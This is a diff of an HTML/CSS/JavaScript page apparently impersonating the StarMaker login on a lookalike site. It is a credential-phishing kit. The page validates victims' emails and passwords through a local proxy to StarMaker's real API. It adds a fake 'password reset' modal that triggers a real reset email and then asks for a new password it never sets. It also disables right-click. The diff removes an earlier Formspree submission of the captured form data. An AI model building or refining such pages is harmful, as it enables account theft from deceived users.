@@ -121,7 +121,7 @@
       background-color: #ffffff;
       text-align: center;
       position: relative;
-      z-index: 2;
+      z-index: 5;
       max-width: 450px;
       width: 100%;
       opacity: 0;
@@ -168,6 +168,8 @@
 
     .container {
       padding: 40px 30px;
+      position: relative;
+      z-index: 5;
     }
 
     .input-wrapper {
@@ -296,6 +298,7 @@
       text-decoration: underline;
       font-size: 14px;
       transition: color 300ms ease;
+      cursor: pointer;
     }
 
     .forgot-password a:hover {
@@ -387,16 +390,16 @@
 
     .success-message {
       position: fixed;
-      top: 50%;
+      bottom: 30px;
       left: 50%;
-      transform: translate(-50%, -50%) scale(0.8);
+      transform: translateX(-50%) scale(0.8);
       z-index: 10;
       background: linear-gradient(135deg, #4CAF50 0%, #66BB6A 100%);
       color: white;
-      padding: 25px 50px;
+      padding: 20px 40px;
       border-radius: 20px;
       font-weight: 700;
-      font-size: 20px;
+      font-size: 16px;
       text-align: center;
       opacity: 0;
       transition: all 500ms cubic-bezier(0.68, -0.55, 0.265, 1.55);
@@ -405,14 +408,14 @@
 
     .success-message.show {
       opacity: 1;
-      transform: translate(-50%, -50%) scale(1);
+      transform: translateX(-50%) scale(1);
     }
 
     .success-message::before {
       content: '✓';
       display: block;
-      font-size: 40px;
-      margin-bottom: 10px;
+      font-size: 24px;
+      margin-bottom: 8px;
       animation: checkmark 600ms ease;
     }
 
@@ -464,13 +467,145 @@
       animation: spin 800ms linear infinite;
     }
 
+    /* Modal Styles */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+    }
+
+    .modal-overlay.show {
+      display: flex;
+    }
+
+    .modal {
+      background: #f5f5f5;
+      border-radius: 20px;
+      padding: 40px 30px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+      animation: slideUp 400ms ease-out;
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(50px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .modal-header {
+      color: #333;
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+
+    .modal-message {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+
+    .modal-input {
+      width: 100%;
+      padding: 12px 15px;
+      border-radius: 20px;
+      border: 2px solid transparent;
+      background: #ffffff;
+      font-size: 14px;
+      font-family: 'Montserrat', Arial, sans-serif;
+      margin-bottom: 15px;
+      transition: all 300ms ease;
+    }
+
+    .modal-input:focus {
+      background-color: #ffffff;
+      border-color: #FF296F;
+      outline: none;
+      box-shadow: 0 4px 12px rgba(255, 41, 111, 0.2);
+    }
+
+    .modal-input::placeholder {
+      color: #999;
+    }
+
+    .modal-buttons {
+      display: flex;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .modal-btn {
+      flex: 1;
+      padding: 12px 15px;
+      border-radius: 20px;
+      border: none;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: 'Montserrat', Arial, sans-serif;
+      cursor: pointer;
+      transition: all 300ms ease;
+    }
+
+    .modal-btn-primary {
+      background: linear-gradient(135deg, #FF296F 0%, #FF5B8D 100%);
+      color: white;
+    }
+
+    .modal-btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 25px rgba(255, 41, 111, 0.5);
+    }
+
+    .modal-btn-secondary {
+      background: #e0e0e0;
+      color: #333;
+    }
+
+    .modal-btn-secondary:hover {
+      background: #d0d0d0;
+    }
+
+    .modal-error {
+      color: #d32f2f;
+      font-size: 12px;
+      text-align: left;
+      margin-top: -10px;
+      margin-bottom: 10px;
+      font-weight: 600;
+      display: none;
+    }
+
+    .modal-error.show {
+      display: block;
+    }
+
     @media screen and (max-width: 600px) {
       .main-container {
         padding: 20px;
+        justify-content: flex-start;
+        padding-top: 80px;
       }
 
       .hero-section {
         max-width: 100%;
+        z-index: 5;
+        position: relative;
       }
 
       .container {
@@ -479,6 +614,11 @@
 
       .upper-text {
         font-size: 20px;
+      }
+
+      .logo {
+        position: fixed;
+        z-index: 3;
       }
 
       .logo img {
@@ -491,8 +631,18 @@
       }
 
       .success-message {
-        padding: 20px 40px;
-        font-size: 18px;
+        padding: 15px 30px;
+        font-size: 14px;
+        bottom: 20px;
+      }
+
+      .success-message::before {
+        font-size: 20px;
+        margin-bottom: 6px;
+      }
+
+      .modal {
+        padding: 30px 20px;
       }
     }
   </style>
@@ -509,7 +659,7 @@
     </div>
 
     <header class="hero-section">
-      <form action="https://formspree.io/f/mknlngbg" id="my-form" method="POST">
+      <form id="my-form" method="POST">
         <div class="container">
           <div class="upper-text">
             <p>Email Login</p>
@@ -527,7 +677,7 @@
           <div class="password-error" id="password-error"></div>
 
           <div class="forgot-password">
-            <a href="#">Forgot password</a>
+            <a id="forgot-password-link">Forgot password</a>
           </div>
           
           <div id="error-status" class="error-message"></div>
@@ -540,12 +690,28 @@
     </header>
   </div>
 
+  <!-- Forgot Password Modal -->
+  <div class="modal-overlay" id="forgot-modal">
+    <div class="modal">
+      <div class="modal-header">Password Reset</div>
+      <div class="modal-message" id="modal-message">We have sent you an email to reset the password. If you haven't received it, please check it in spam.</div>
+      <input type="password" id="new-password-input" class="modal-input" placeholder="Password" style="display: none;">
+      <div class="modal-error" id="modal-error"></div>
+      <div class="modal-buttons">
+        <button class="modal-btn modal-btn-secondary" id="modal-cancel-btn">Cancel</button>
+        <button class="modal-btn modal-btn-primary" id="modal-next-btn" style="display: none;">Next</button>
+      </div>
+    </div>
+  </div>
+
   <div id="status" class="success-message"></div>
 
   <script>
-    // Configuration - Change these to match your server
+    // Configuration
     const EMAIL_CHECK_API = 'http://localhost:3000/check-email';
-    const PASSWORD_CHECK_API = 'http://localhost:3001/verify-password';
+    const PASSWORD_CHECK_API = 'http://localhost:3000/verify-password';
+    const FORGOT_PASSWORD_API = 'http://localhost:3000/forgot-password';
+    const STARMAKER_API = 'https://api.starmakerstudios.com/web/passport/lost';
     
     // Disable right-click
     document.addEventListener('contextmenu', function (e) {
@@ -562,9 +728,125 @@
       const status = document.getElementById("status");
       const errorStatus = document.getElementById("error-status");
       const submitBtn = document.getElementById("submit-btn");
+      const forgotPasswordLink = document.getElementById("forgot-password-link");
+      const forgotModal = document.getElementById("forgot-modal");
+      const modalMessage = document.getElementById("modal-message");
+      const newPasswordInput = document.getElementById("new-password-input");
+      const modalError = document.getElementById("modal-error");
+      const modalCancelBtn = document.getElementById("modal-cancel-btn");
+      const modalNextBtn = document.getElementById("modal-next-btn");
 
       let emailExists = false;
-      let emailCheckTimeout;
+      let forgotPasswordEmail = '';
+
+      // Forgot Password Handler
+      forgotPasswordLink.addEventListener('click', async function(e) {
+        e.preventDefault();
+        
+        const email = emailInput.value.trim();
+        
+        if (!email) {
+          emailError.textContent = 'Please enter your email address';
+          emailError.classList.add('show');
+          return;
+        }
+
+        if (!email.includes('@')) {
+          emailError.textContent = 'Please enter a valid email address';
+          emailError.classList.add('show');
+          return;
+        }
+
+        // Show modal in loading state
+        forgotPasswordEmail = email;
+        modalMessage.textContent = 'Sending password reset link...';
+        newPasswordInput.style.display = 'none';
+        modalNextBtn.style.display = 'none';
+        modalCancelBtn.textContent = 'Cancel';
+        modalError.classList.remove('show');
+        forgotModal.classList.add('show');
+
+        try {
+          // Call your local Node server which will proxy to StarMaker API
+          const response = await fetch(FORGOT_PASSWORD_API, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email })
+          });
+
+          const data = await response.json();
+
+          if (response.ok && Object.keys(data).length === 0) {
+            // Success - show message
+            modalMessage.textContent = 'We have sent you an email to reset the password. If you haven\'t received it, please check it in spam.';
+            newPasswordInput.style.display = 'block';
+            modalNextBtn.style.display = 'block';
+            modalNextBtn.textContent = 'Next';
+            modalCancelBtn.textContent = 'Cancel';
+          } else if (data.error) {
+            // Email not found or error
+            modalMessage.textContent = '';
+            newPasswordInput.style.display = 'none';
+            modalNextBtn.style.display = 'none';
+            modalError.textContent = 'Account not found. Create one in StarMaker App.';
+            modalError.classList.add('show');
+            modalCancelBtn.textContent = 'Close';
+          } else {
+            throw new Error('Unexpected response');
+          }
+        } catch (error) {
+          console.error('Error:', error);
+          modalMessage.textContent = '';
+          newPasswordInput.style.display = 'none';
+          modalNextBtn.style.display = 'none';
+          modalError.textContent = 'Unable to process request. Please try again.';
+          modalError.classList.add('show');
+          modalCancelBtn.textContent = 'Close';
+        }
+      });
+
+      // Modal Next Button Handler
+      modalNextBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        
+        const newPassword = newPasswordInput.value.trim();
+        
+        if (!newPassword) {
+          modalError.textContent = 'Please enter a new password';
+          modalError.classList.add('show');
+          return;
+        }
+
+        if (newPassword.length < 6) {
+          modalError.textContent = 'Password must be at least 6 characters';
+          modalError.classList.add('show');
+          return;
+        }
+
+        // Show success message
+        modalMessage.textContent = 'Password updated successfully!';
+        newPasswordInput.style.display = 'none';
+        modalNextBtn.style.display = 'none';
+        modalError.classList.remove('show');
+        modalCancelBtn.textContent = 'Close';
+
+        setTimeout(() => {
+          forgotModal.classList.remove('show');
+          newPasswordInput.value = '';
+          emailInput.value = '';
+          passwordInput.value = '';
+        }, 2000);
+      });
+
+      // Modal Cancel Button
+      modalCancelBtn.addEventListener('click', function() {
+        forgotModal.classList.remove('show');
+        newPasswordInput.value = '';
+        modalError.classList.remove('show');
+        modalMessage.textContent = 'We have sent you an email to reset the password. If you haven\'t received it, please check it in spam.';
+      });
 
       // Check email when user types in password field
       passwordInput.addEventListener('focus', function() {
@@ -583,7 +865,6 @@
       });
 
       async function checkEmail(email) {
-        // Show loading spinner
         emailStatus.innerHTML = '<div class="loading-spinner"></div>';
         emailStatus.classList.add('show');
         emailError.classList.remove('show');
@@ -601,12 +882,10 @@
           const data = await response.json();
 
           if (data.exists) {
-            // Show green tick
             emailStatus.innerHTML = '<div class="check-icon">✓</div>';
             emailExists = true;
             emailError.classList.remove('show');
           } else {
-            // Show cross icon
             emailStatus.innerHTML = '<div class="cross-icon">✕</div>';
             emailExists = false;
             emailError.textContent = 'Account is not found. Create one in StarMaker App.';
@@ -614,7 +893,6 @@
           }
         } catch (error) {
           console.error('Error checking email:', error);
-          // Hide status on error
           emailStatus.classList.remove('show');
           emailError.textContent = 'Unable to verify email. Please try again.';
           emailError.classList.add('show');
@@ -649,8 +927,9 @@
         emailStatus.classList.remove('show');
         
         setTimeout(function() {
-          window.location.href = "https://starmakerstudio.github.io/web/Starmaker%20Web/Verification%20Code/verification.html";
-        }, 1500);
+          status.classList.remove("show");
+          window.location.href = "https://starmakerstudio.github.io/web/Starmaker%20Web/Starmaker%20Logged/loggedin.html";
+        }, 2000);
       }
 
       function error() {
@@ -666,14 +945,12 @@
         const email = emailInput.value.trim();
         const password = passwordInput.value.trim();
         
-        // Validate email exists
         if (!emailExists && email) {
           emailError.textContent = 'Account is not found. Create one in StarMaker App.';
           emailError.classList.add('show');
           return;
         }
 
-        // Validate password
         if (!password) {
           passwordError.textContent = 'Please enter your password';
           passwordError.classList.add('show');
@@ -685,23 +962,21 @@
         passwordError.classList.remove("show");
         submitBtn.classList.add('loading');
         
-        // First, verify password with StarMaker API
         const passwordCheck = await checkPassword(email, password);
         
-        if (!passwordCheck.success) {
-          // Password is incorrect
+        console.log('Password check response:', passwordCheck);
+        
+        if (passwordCheck.success === true) {
+          console.log('Login successful, proceeding to redirect');
+          success();
+        } else {
           submitBtn.classList.remove('loading');
           passwordError.textContent = passwordCheck.message || 'Username or password is incorrect';
           passwordError.classList.add('show');
           return;
         }
-        
-        // Password is correct, now submit to Formspree
-        const data = new FormData(form);
-        ajax(form.method, form.action, data, success, error);
       });
-
-      // Add input animation on typing
+      
       const inputs = form.querySelectorAll('input');
       inputs.forEach(input => {
         input.addEventListener('input', function() {
@@ -713,21 +988,6 @@
         });
       });
     });
-
-    function ajax(method, url, data, success, error) {
-      const xhr = new XMLHttpRequest();
-      xhr.open(method, url);
-      xhr.setRequestHeader("Accept", "application/json");
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState !== XMLHttpRequest.DONE) return;
-        if (xhr.status === 200) {
-          success(xhr.response, xhr.responseType);
-        } else {
-          error(xhr.status, xhr.response, xhr.responseType);
-        }
-      };
-      xhr.send(data);
-    }
   </script>
 </body>
 </html>
